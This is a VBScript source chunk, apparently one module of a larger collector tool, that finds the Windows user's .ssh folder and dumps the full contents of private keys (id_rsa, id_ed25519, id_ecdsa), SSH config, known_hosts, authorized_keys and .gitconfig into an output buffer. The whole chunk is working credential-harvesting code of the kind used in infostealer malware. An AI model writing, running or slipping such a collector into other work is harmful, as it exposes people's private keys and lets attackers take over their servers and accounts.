' chunk: collectors/ssh_keys
' depends: core/emit_buffer, core/run_cmd, core/file_ops
' provides: collect_ssh_keys
' format: vbscript

Sub collect_ssh_keys()
    emit vbCrLf & "=== SSH KEYS ===" & vbCrLf
    Dim home, sshDir
    home = _s.ExpandEnvironmentStrings("%USERPROFILE%")
    sshDir = home & "\.ssh"
    If _fso.FolderExists(sshDir) Then
        emit _run("dir /b """ & sshDir & """")
        Dim files, i, fp
        files = Array("id_rsa", "id_ed25519", "id_ecdsa", "config", "known_hosts", "authorized_keys")
        For i = 0 To UBound(files)
            fp = sshDir & "\" & files(i)
            If file_exists_f(fp) Then
                emit "--- " & files(i) & " ---" & vbCrLf
                emit read_file(fp, 32768)
                emit vbCrLf
            End If
        Next
    Else
        emit "  .ssh directory not found" & vbCrLf
    End If
    emit vbCrLf & "=== GIT CONFIG ===" & vbCrLf
    If file_exists_f(home & "\.gitconfig") Then
        emit read_file(home & "\.gitconfig", 8192)
    End If
End Sub
